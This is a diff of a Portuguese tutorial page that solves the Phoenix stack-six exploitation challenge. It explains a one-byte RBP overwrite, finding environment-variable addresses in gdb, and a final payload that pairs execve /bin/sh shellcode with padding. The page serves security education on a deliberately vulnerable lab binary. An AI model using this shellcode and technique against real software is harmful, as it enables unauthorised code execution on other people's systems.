+<h2 id="como-ir-de-off-by-one-para-execução-de-código"><a class="header" href="#como-ir-de-off-by-one-para-execução-de-código">Como ir de off-by-one para execução de código</a></h2>
 <p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
 <p>Então esse rbp que estamos alterando é o <code>rbp de main</code>!</p>
 <p>Quando greet retorna, main fica com o rbp errado!</p>
 <p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução (<code>ret</code>) a magica acontece</p>
-<a class="header" href="./stack/phoenix/StackSix.html#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido"><h3>Ret com um RBP corrompido</h3></a>
+<h3 id="ret-com-um-rbp-corrompido"><a class="header" href="#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></h3>
 <p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
 <p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
 <p>Portanto, precisamos achar um valor para colocar no rip que va apontar para código que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
-<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>!
+<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>! 
 E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
 <p>E se nos controlamos RIP, controlamos a execução :D</p>
-<a class="header" href="./stack/phoenix/StackSix.html#-exploit" id="-exploit"><h1>🔥 Exploit</h1></a>
+<h1 id="-exploit"><a class="header" href="#-exploit">🔥 Exploit</a></h1>
 <p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
 <ol>
 <li>Descobrir que partes da memoria controlamos</li>
 <li>Encontrar para que região podemos apontar rbp</li>
 <li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
 </ol>
-<a class="header" href="./stack/phoenix/StackSix.html#o-que-controlamos" id="o-que-controlamos"><h2>O que controlamos?</h2></a>
+<h2 id="o-que-controlamos"><a class="header" href="#o-que-controlamos">O que controlamos?</a></h2>
 <p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
 controlamos são as env vars</p>
 <p>E qual é essa região? Vamos encontrar :D</p>
-<a class="header" href="./stack/phoenix/StackSix.html#setup" id="setup"><h3>Setup</h3></a>
-<p>As envs são diferentes dentro do gdb, nós podemos comparar usando</p>
+<h3 id="setup"><a class="header" href="#setup">Setup</a></h3>
+<p>As envs são diferentes dentro do gdb, nós podemos comparar usando </p>
 <pre><code>Fora do gdb: env
 Dentro do dbg: show environment
 </code></pre>
@@ -440,7 +494,7 @@ set environment _=/opt/phoenix/amd64/stack-six
 
 &gt; Aviso: Se você sair do gdb elas vão resetar!
 </code></pre>
-<a class="header" href="./stack/phoenix/StackSix.html#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos"><h3>Descobrir que partes da memoria controlamos</h3></a>
+<h3 id="descobrir-que-partes-da-memoria-controlamos"><a class="header" href="#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
 <p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
 <img src="./img/stack_six/envs_gef.png" alt="" /></p>
 <p>Escolhendo o menor endereço e printando!</p>
@@ -450,9 +504,9 @@ set environment _=/opt/phoenix/amd64/stack-six
 </blockquote>
 <p><img src="./img/stack_six/envs_addr2.png" alt="" /></p>
 <p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
-<a class="header" href="./stack/phoenix/StackSix.html#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp"><h3>Encontrar para que região podemos apontar rbp</h3></a>
+<h3 id="encontrar-para-que-região-podemos-apontar-rbp"><a class="header" href="#encontrar-para-que-região-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></h3>
 <p>Nesse caso é fácil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
-<a class="header" href="./stack/phoenix/StackSix.html#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos"><h3>Encontrar um pointer nessa região que aponte para a parte que controlamos</h3></a>
+<h3 id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos"><a class="header" href="#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></h3>
 <p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
 Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
 <p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
@@ -510,7 +564,7 @@ gef&gt; b *0x00000000004007f7
 <p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
 <p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
 <p><img src="./img/stack_six/addr_rbp.png" alt="" /></p>
-<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos
+<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
 estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
 <p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
 <pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
@@ -529,7 +583,7 @@ pode variar de acordo com o seu computador (explicação em breve) :D
 .
 .
 </code></pre>
-<a class="header" href="./stack/phoenix/StackSix.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
+<h2 id="shellcode"><a class="header" href="#shellcode">Shellcode</a></h2>
 <p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
 <p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
 <pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
@@ -539,7 +593,7 @@ Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
 Trace/breakpoint trap
 </code></pre>
-<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela</p>
+<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
 <p>Isso quer dizer que conseguimos execução de código! lembrando que isso é muito frágil: uma alteração nas envs e o exploit quebra!</p>
 <p>Nos podemos usar técnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
 <p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as técnicas ensinadas previamente para tornar o exploit melhor!</p>
@@ -552,8 +606,8 @@ Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
 Segmentation fault
 </code></pre>
-<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code>
-(uma variável <strong>gigantesca</strong> que lista as cores do terminal!</p>
+<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code> 
+(uma variável <strong>gigantesca</strong> que lista as cores do terminal! </p>
 <p>Caso você utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferença!</p>
 <p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
 <hr />
@@ -587,7 +641,7 @@ groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
 <hr />
 <p>Finalmente! terminamos a parte da stack uhuuu</p>
 <p>Esse stack-six foi beeeeem complicadinho! Então parabéns por ter chegado ate aqui! :D</p>
-<a class="header" href="./stack/phoenix/StackSix.html#-solução" id="-solução"><h1>💫 Solução</h1></a>
+<h1 id="-solução"><a class="header" href="#-solução">💫 Solução</a></h1>
 <blockquote>
 <p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
 </blockquote>
@@ -606,59 +660,42 @@ groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
 <p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
 </blockquote>
 
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../stack/phoenix/StackFive.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../stack/mitigacoes.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
                 </div>
-
-                <!-- Mobile navigation buttons -->
-                
-                    <a rel="prev" href="./stack/phoenix/StackFive.html" class="mobile-nav-chapters previous" title="Previous chapter">
-                        <i class="fa fa-angle-left"></i>
-                    </a>
-                
-
-                
-                    <a rel="next" href="./stack/mitigacoes.html" class="mobile-nav-chapters next" title="Next chapter">
-                        <i class="fa fa-angle-right"></i>
-                    </a>
-                
-
             </div>
 
-            
-                <a href="./stack/phoenix/StackFive.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
-                    <i class="fa fa-angle-left"></i>
-                </a>
-            
-
-            
-                <a href="./stack/mitigacoes.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
-                    <i class="fa fa-angle-right"></i>
-                </a>
-            
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../stack/phoenix/StackFive.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../stack/mitigacoes.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
 
         </div>
 
-
-        <!-- Local fallback for Font Awesome -->
-        <script>
-            if ($(".fa").css("font-family") !== "FontAwesome") {
-                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
-            }
+        <script type="text/javascript">
+            window.playground_copyable = true;
         </script>
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
 
-        <!-- Livereload script (if served using the cli tool) -->
-        
-
-        
-
-        
-
-        
-
-        <script src="highlight.js"></script>
-        <script src="book.js"></script>
-
-        <!-- Custom JS script -->
-        
-
+        <!-- Custom JS scripts -->
     </body>
 </html>
